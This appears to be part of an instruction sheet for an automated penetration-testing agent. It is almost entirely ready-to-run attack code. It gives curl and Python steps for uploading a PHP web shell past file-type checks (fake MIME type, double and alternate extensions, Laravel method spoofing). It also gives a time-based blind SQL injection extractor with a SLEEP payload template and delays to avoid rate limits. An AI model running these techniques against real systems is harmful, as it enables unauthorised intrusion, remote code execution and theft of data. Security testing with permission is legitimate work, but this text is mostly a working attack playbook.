--- FILE UPLOAD (if not using http_upload tool) ---
IMPORTANT — Laravel method spoofing: Laravel routes often require PUT but HTML forms can only POST.
The form will have a hidden field: <input type="hidden" name="_method" value="PUT">
When uploading to a Laravel form, ALWAYS include _method=PUT in the multipart form data:
    files = {"avatar": ("shell.php.jpg", open("/tmp/shell.php.jpg","rb"), "image/jpeg")}
    data  = {"_token": token, "_method": "PUT"}
    r = s.post("http://target/admin/auth/setting", files=files, data=data)
Without _method=PUT you will get 405 Method Not Allowed every time.

If the upload form validates file type/extension, try these bypasses IN ORDER:
1. Fake MIME type (most common bypass — server trusts Content-Type header):
    curl -s -b $COOK -F "file=@/tmp/shell.php;type=image/jpeg" -F "submit=Upload" http://target/upload.php

    curl -s -b $COOK -F "file=@/tmp/shell.php.jpg" -F "submit=Upload" http://target/upload.php
3. Alternative PHP extensions (if .php is blocked):
    cp /tmp/shell.php /tmp/shell.phtml
    curl -s -b $COOK -F "file=@/tmp/shell.phtml" -F "submit=Upload" http://target/upload.php

--- TIME-BASED BLIND SQLi EXTRACTION (when sqlmap is blocked or rate-limited) ---
Use this pattern when you need to manually extract data char-by-char with SLEEP payloads.

TIMING — CRITICAL: measure time around requests.get(), NOT around r.text or any other operation:
    import time, requests
    def check_sleep(url, params, threshold=3):
        start = time.time()
        try:
            requests.get(url, params=params, timeout=threshold + 5)
        except Exception:
            pass
        return (time.time() - start) >= threshold

BINARY SEARCH — use this instead of linear character scan (10x fewer requests):
    def extract_char(url, payload_template, pos):
        lo, hi = 32, 126  # printable ASCII range
        while lo < hi:
            mid = (lo + hi) // 2
            payload = payload_template.format(pos=pos, mid=mid)
            if check_sleep(url, {"param": payload}):
                lo = mid + 1
            else:
                hi = mid
            time.sleep(2)  # delay between every request to avoid rate limiting
        return chr(lo) if lo != 32 else None

    # Payload template example (adapt to actual injection point):
    # "1 AND IF(ASCII(SUBSTRING((SELECT col FROM tbl LIMIT 1),{pos},1))>{mid},SLEEP(3),0)"

    def extract_string(url, payload_template, max_len=50):
        result = ""
        for pos in range(1, max_len + 1):
            ch = extract_char(url, payload_template, pos)
            if not ch:
                break
            result += ch
            print(f"[+] pos {pos}: {result}", flush=True)
        return result
